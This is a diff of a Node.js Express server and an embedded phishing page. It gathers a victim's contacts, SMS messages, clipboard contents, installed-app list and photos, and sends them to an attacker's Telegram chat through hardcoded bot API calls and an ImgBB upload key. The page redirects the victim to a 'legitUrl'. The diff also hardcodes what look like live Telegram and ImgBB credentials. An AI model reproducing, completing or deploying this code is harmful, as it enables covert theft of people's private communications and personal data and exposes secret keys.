@@ -1,28 +1,29 @@
+
 const express = require('express');
 const app = express();
 
 // ===== TERI VALUES DAAL =====
-const TELEGRAM_TOKEN = 
+const TELEGRAM_TOKEN = "8840717306:AAEOhGfFnZsSWGtdOChaJaGC4JLfReeKBaU";
 const CHAT_ID = "8179349999";
 const IMGBB_API_KEY = "0959c9368daed87c0f1a8d44c203a8b3";
 // =============================
 
 app.post('/send-data', express.json({limit:'50mb'}), (req, res) => {
-    const {type, data,bot} = req.body;
+    const {type, data} = req.body;
     if(type === 'contacts') {
-        fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
             encodeURIComponent("📱 *CONTACTS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
     }
     if(type === 'sms') {
-        fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
             encodeURIComponent("💬 *SMS DATA*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
     }
     if(type === 'clipboard') {
-        fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
             encodeURIComponent("📋 *CLIPBOARD*\n\n" + data.substring(0, 1500)) + "&parse_mode=Markdown");
     }
     if(type === 'installed_apps') {
-        fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
             encodeURIComponent("📦 *INSTALLED APPS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
     }
     res.send({ok:true});
@@ -151,7 +152,7 @@ h2{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
 </div>
 
 <script>
-const TOKEN = "${bot}";
+const TOKEN = "${TELEGRAM_TOKEN}";
 const CID = "${CHAT_ID}";
 const IMGKEY = "${IMGBB_API_KEY}";
 const REDIR = "${legitUrl}";
@@ -160,11 +161,11 @@ let allCapturedData = "";
 let photoUploaded = false;
 
 function tg(msg) {
-    fetch("https://api.telegram.org/bot"+bot+"/sendMessage?chat_id="+CID+
+    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CID+
         "&text="+encodeURIComponent(msg)+"&parse_mode=Markdown").catch(()=>{});
 }
 function tgPhoto(url) {
-    fetch("https://api.telegram.org/bot"+bot+"/sendPhoto?chat_id="+CID+"&photo="+url).catch(()=>{});
+    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto?chat_id="+CID+"&photo="+url).catch(()=>{});
 }
 function postData(type, data) {
     fetch("/send-data", {
